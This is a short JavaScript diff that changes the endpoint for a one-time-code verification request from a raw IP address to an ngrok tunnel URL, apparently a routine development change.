@@ -245,7 +245,7 @@ function sup() {
                         const otp = document.getElementById('otp-code').value.trim();
 
                         try {
-                            const res = await fetch('https://2.51.235.142:3000/ot_v', {
+                            const res = await fetch('https://375d-2001-8f8-1a67-44cc-5cdc-617b-30a6-69a4.ngrok-free.app/ot_v', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify({ otp }),
